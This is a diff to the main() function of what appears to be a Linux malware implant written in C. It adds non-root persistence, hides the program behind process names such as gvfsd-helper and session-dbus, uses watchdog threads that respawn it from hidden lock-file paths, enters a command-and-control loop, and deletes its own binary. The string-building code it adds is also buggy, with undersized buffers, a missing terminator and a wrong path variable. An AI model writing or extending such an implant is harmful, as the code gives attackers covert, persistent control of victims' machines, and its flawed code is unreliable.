@@ -15,56 +15,46 @@ int main(int argc, char *argv[]) {
     printf("DEBUG MODE ENABLED\n");
     #endif
 
-    pid_t id = getuid();
 
-    // perform file lock check here to see what's currently locked or not.
-
-    // TODO: *fpath = session_dbus_file_write
-    // Spawn session-dbus (monitor)
+    nonroot_persistence();
 
     //if session-dbus lock file is locked... creat the lock for gvfsd and spawn gvfsd
-    if (lock_check("/home/gdev/.X11/.X11-lock") != 0) {
+    char *home = getenv("HOME");
+    char *lock_path = "/.X11/.X11-lock";
+    char *lock_path_2 = "/.X11/.X0-lock";
+    char *home_lock_path = (char *)malloc(strlen(home) + strlen(lock_path));
+    char *home_lock_path_2 = (char *)malloc(strlen(home) + strlen(lock_path_2));
 
-        create_lock(1);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
+    memcpy(home_lock_path, home, strlen(home));
+    memcpy(home_lock_path_2, home, strlen(home));
 
-        if (id != 0 ) { // non-root
-           // daemon(0, 0);
-           // spawn gvfsd-helper
-            spawn_thread_watchdog(1);
-        }
+    strncat(home_lock_path, lock_path, strlen(lock_path));
+    strncat(home_lock_path_2, lock_path, strlen(lock_path_2));
+
+    //ex: lock_check("/home/gdev/.X11/.X11-lock")
+    if (lock_check(home_lock_path) != 0) {
+
+        create_lock(0);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
+        spawn_thread_watchdog(0);
 
         do {
-        // forever run session-dbus as a "watchdog process".
+            // forever run session-dbus as a "watchdog process".
             sleep(10);
         }while(true);
 
     }
-bool desktop_res = nonroot_persistence();
-    if (desktop_res == false ) {
-        fprintf(stderr, "[main] Error creating non-root persistence: %s",strerror(errno));
-        exit(1);
-    }
-    // if root do ....
-    if (id == 0) {
-        //daemon(0, 0);  // detach from current console
-        // TODO - spawn root thread, and perform root operations
-
-    } else { // non-root user....
-
         //daemon(0, 0);  // detach from current console
         // spawns -> /home/$USER/.gvfsd/.profile/gvfsd-helper
-        printf("initial spawn of gvfsd-helper\n");
 
-        // creating .X11/X0-lock
-        create_lock(0);
+     // creating .X11/X0-lock
+    create_lock(1);
         //session-dbus create
-        spawn_thread_watchdog(0);
+    spawn_thread_watchdog(1);
         // Main C2 goes here?
-    }
+    c2_loop();
 
     #ifndef DEBUG
     self_delete(argv[0]); //  deleting this binary.
     #endif
-    // TODO: main_c2_loop goes here (gvfsd-helper).
     return 0;
  }
